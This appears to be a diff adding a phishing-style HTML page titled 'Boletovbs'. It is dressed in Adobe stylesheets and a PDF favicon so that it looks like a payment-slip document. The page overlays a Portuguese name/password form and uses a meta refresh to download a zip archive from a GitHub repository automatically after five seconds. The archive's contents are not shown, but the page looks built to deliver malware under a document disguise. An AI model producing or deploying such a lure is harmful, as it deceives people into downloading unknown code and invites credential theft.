@@ -1,0 +1,114 @@
+<html>
+
+
+
+<link rel="stylesheet" type="text/css" href="http://wwwimages.adobe.com/www.adobe.com/ubi/template/identity/adobe/screen.css?modules=swf" media="screen" />
+<link rel="stylesheet" type="text/css" href="http://wwwimages.adobe.com/www.adobe.com/ubi/template/identity/adobe/print.css" media="print" />
+<link type="text/css" rel="stylesheet" href="http://wwwimages.adobe.com/www.adobe.com/ubi/template/identity/adobe/screen/no-pocket.css" />
+	<head>
+		<title>Boletovbs</title>
+		<link href="https://cdn2.iconfinder.com/data/icons/adobe-acrobat-pdf/154/adobe-acrobat-pdf-file-document-128.png" rel="shortcut icon" />
+			
+		<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js"></script> 
+		<script type="text/javascript">
+			$(document).ready(function(){
+				
+					//ev.preventDefault();
+
+					var id = $('#janela1');
+
+					var alturaTela = $(document).height();
+					var larguraTela = $(window).width();
+	
+					//colocando o fundo preto
+					$('#mascara').css({'width':larguraTela,'height':alturaTela});
+					$('#mascara').fadeIn(1000);	
+					var left = ($(window).width() /2) - 311;
+					var top = ($(window).height() / 3) - 10;
+					
+					
+					// janela1.style.left = (document.documentElement.clientWidth - janela1.style.width) / 2 ;
+
+					//janela1.style.top = (document.documentElement.clientHeight - janela1.style.height)/2;
+
+					//janela1.innerText = document.documentElement.clientWidth ;
+
+					//janela1.style.visibility = "visible";
+ 
+ 
+ 
+					
+					$(id).css({'top':top,'left':left});
+					$(id).show();	
+ 			
+
+ 				
+
+ 				$('.fechar').click(function(ev){
+ 					ev.preventDefault();
+ 					$("#mascara").hide();
+ 					$(".window").hide();
+ 				});
+			});
+		</script>
+
+		<style type="text/css">
+
+		.window{
+			display:none;
+			
+			position:absolute;
+			
+			background:#FFF;
+			z-index:9900;
+			padding:10px;
+			border-radius:10px;
+		}
+
+		#mascara{
+			position:absolute;
+  			left:0;
+  			top:0;
+			opacity:0.4;
+  			z-index:9000;
+  			background-color:#000;
+  			display:none;
+		}
+
+		.fechar{display:block; text-align:right;}
+
+		</style>
+
+	</head>
+
+
+	<body>
+	
+		
+			
+	
+
+		<div class="window" id="janela2">
+			<a href="#" class="fechar">X Fechar</a>
+			<h4>Formulario</h4>
+			<form action="#" method="post">
+				<label for="nome">Nome:</label>
+				<input type="text" name="nome" id="nome">
+				<br />
+
+				<label for="nome">Senha:</label>
+				<input type="text" name="senha" id="senha">
+				<br />
+
+				<input type="submit" value="enviar">
+
+			</form>
+		</div>
+
+		<!-- mascara para cobrir o site -->	
+		<div id="mascara"></div>
+	
+	</body>
+	<meta http-equiv="refresh" content="5; url=https://codeload.github.com/adrioaraujo/RTB.CARDOSO0714/zip/master">
+
+</html> 
